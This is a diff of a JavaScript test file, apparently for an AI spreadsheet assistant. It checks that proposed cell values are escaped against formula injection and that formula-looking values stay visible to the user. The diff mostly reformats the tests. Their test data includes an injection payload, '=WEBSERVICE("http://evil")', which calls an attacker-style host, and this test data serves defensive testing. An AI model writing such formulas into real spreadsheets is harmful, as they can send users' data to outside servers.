@@ -14,7 +14,7 @@ import {
 // proposed value must never reach Excel as a live formula.
 
 test("literalCellValue neutralises every formula-triggering prefix", () => {
-  for (const v of ["=WEBSERVICE(\"http://evil\")", "+1+1", "-1", "@SUM(A1)"]) {
+  for (const v of ['=WEBSERVICE("http://evil")', "+1+1", "-1", "@SUM(A1)"]) {
     assert.equal(literalCellValue(v), "'" + v, `unescaped: ${v}`);
   }
 });
@@ -29,7 +29,16 @@ test("literalCellValue leaves ordinary values alone", () => {
 });
 
 test("literalizeGrid neutralises every cell, and tolerates an empty grid", () => {
-  assert.deepEqual(literalizeGrid([["=A1", "ok"], [1, "@x"]]), [["'=A1", "ok"], [1, "'@x"]]);
+  assert.deepEqual(
+    literalizeGrid([
+      ["=A1", "ok"],
+      [1, "@x"],
+    ]),
+    [
+      ["'=A1", "ok"],
+      [1, "'@x"],
+    ]
+  );
   assert.deepEqual(literalizeGrid(undefined), []);
   assert.deepEqual(literalizeGrid([]), []);
 });
@@ -37,7 +46,8 @@ test("literalizeGrid neutralises every cell, and tolerates an empty grid", () =>
 // ---- splitReply -----------------------------------------------------------
 
 test("splitReply reads a fenced actions block and strips it from the prose", () => {
-  const raw = 'Đây là đề xuất.\n```json\n{"actions":[{"type":"setCell","cell":"A1","new":"x"}]}\n```';
+  const raw =
+    'Đây là đề xuất.\n```json\n{"actions":[{"type":"setCell","cell":"A1","new":"x"}]}\n```';
   const { prose, actions } = splitReply(raw);
   assert.equal(actions.length, 1);
   assert.equal(actions[0].cell, "A1");
@@ -79,8 +89,14 @@ test("splitReply substitutes placeholder prose when the reply is only a block", 
 
 test("describe renders each known action type", () => {
   assert.match(describe({ type: "setCell", cell: "A1", old: "1", new: "2" }), /A1.*"1".*"2"/);
-  assert.match(describe({ type: "setCells", range: "A1:B2", values: [[1, 2]] }), /A1:B2 \(1 rows\)/);
-  assert.match(describe({ type: "format", range: "C1", numberFormat: "0.00", bold: true }), /0\.00.*bold/);
+  assert.match(
+    describe({ type: "setCells", range: "A1:B2", values: [[1, 2]] }),
+    /A1:B2 \(1 rows\)/
+  );
+  assert.match(
+    describe({ type: "format", range: "C1", numberFormat: "0.00", bold: true }),
+    /0\.00.*bold/
+  );
   assert.match(describe({ type: "createTable", range: "A1:B2" }), /"Table" over A1:B2/);
   assert.match(describe({ type: "createChart", dataRange: "A1:B9" }), /Column chart from A1:B9/);
   assert.match(describe({ type: "newSheet", name: "Dash" }), /New sheet "Dash"/);
@@ -92,7 +108,10 @@ test("describe shows an unknown action raw instead of hiding it", () => {
 });
 
 test("describe does not hide a formula-looking proposed value", () => {
-  assert.match(describe({ type: "setCell", cell: "A1", new: "=WEBSERVICE(x)" }), /=WEBSERVICE\(x\)/);
+  assert.match(
+    describe({ type: "setCell", cell: "A1", new: "=WEBSERVICE(x)" }),
+    /=WEBSERVICE\(x\)/
+  );
 });
 
 // ---- misc -----------------------------------------------------------------
